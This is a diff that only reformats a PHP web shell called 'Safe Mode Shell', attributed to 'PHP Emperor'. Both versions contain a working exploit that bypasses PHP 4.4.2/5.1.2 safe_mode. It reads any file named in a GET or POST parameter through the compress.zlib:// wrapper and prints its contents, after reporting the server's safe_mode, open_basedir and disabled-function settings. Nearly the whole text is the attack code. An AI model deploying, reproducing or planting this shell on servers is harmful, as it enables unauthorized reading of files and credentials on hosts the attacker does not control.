@@ -24,65 +24,79 @@ Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
 by PHP Emperor<xb5@hotmail.com>
 */
 
-echo "<head><title>Safe Mode Shell</title></head>"; 
+echo "<head><title>Safe Mode Shell</title></head>";
 
 
 
 
 $tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
 
-if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
-{
- $safemode = true;
- $hsafemode = "<font color=\"red\">ON (secure)</font>";
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
+    $safemode = true;
+    $hsafemode = "<font color=\"red\">ON (secure)</font>";
+} else {
+    $safemode = false;
+    $hsafemode = "<font color=\"green\">OFF (not secure)</font>";
 }
-else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
 echo("Safe-mode: $hsafemode");
 $v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
-else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
+if ($v or strtolower($v) == "on") {
+    $openbasedir = true;
+    $hopenbasedir = "<font color=\"red\">".$v."</font>";
+} else {
+    $openbasedir = false;
+    $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";
+}
 echo("<br>");
 echo("Open base dir: $hopenbasedir");
 echo("<br>");
 echo "Disable functions : <b>";
-if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
+if (''==($df=@ini_get('disable_functions'))) {
+    echo "<font color=green>NONE</font></b>";
+} else {
+    echo "<font color=red>$df</font></b>";
+}
 $free = @diskfreespace($dir);
-if (!$free) {$free = 0;}
+if (!$free) {
+    $free = 0;
+}
 $all = @disk_total_space($dir);
-if (!$all) {$all = 0;}
+if (!$all) {
+    $all = 0;
+}
 $used = $all-$free;
-$used_percent = @round(100/($all/$free),2);
+$used_percent = @round(100/($all/$free), 2);
 
 echo "<PRE>\n";
-if(empty($file)){
-if(empty($_GET['file'])){
-if(empty($_POST['file'])){
-die("\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\n <B><CENTER><FONT
+if (empty($file)) {
+    if (empty($_GET['file'])) {
+        if (empty($_POST['file'])) {
+            die("\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\n <B><CENTER><FONT
 COLOR=\"RED\">PHP Emperor
 xb5@hotmail.com</FONT></CENTER></B>");
-} else {
-$file=$_POST['file'];
-}
-} else {
-$file=$_GET['file'];
-}
+        } else {
+            $file=$_POST['file'];
+        }
+    } else {
+        $file=$_GET['file'];
+    }
 }
 
 $temp=tempnam($tymczas, "cx");
 
-if(copy("compress.zlib://".$file, $temp)){
-$zrodlo = fopen($temp, "r");
-$tekst = fread($zrodlo, filesize($temp));
-fclose($zrodlo);
-echo "<B>--- Start File ".htmlspecialchars($file)."
+if (copy("compress.zlib://".$file, $temp)) {
+    $zrodlo = fopen($temp, "r");
+    $tekst = fread($zrodlo, filesize($temp));
+    fclose($zrodlo);
+    echo "<B>--- Start File ".htmlspecialchars($file)."
 -------------</B>\n".htmlspecialchars($tekst)."\n<B>--- End File
 ".htmlspecialchars($file)." ---------------\n";
-unlink($temp);
-die("\n<FONT COLOR=\"RED\"><B>File
+    unlink($temp);
+    die("\n<FONT COLOR=\"RED\"><B>File
 ".htmlspecialchars($file)." has been already loaded. PHP Emperor <xb5@hotmail.com>
 ;]</B></FONT>");
 } else {
-die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
+    die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
 <B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
 access.</CENTER></FONT>");
 }
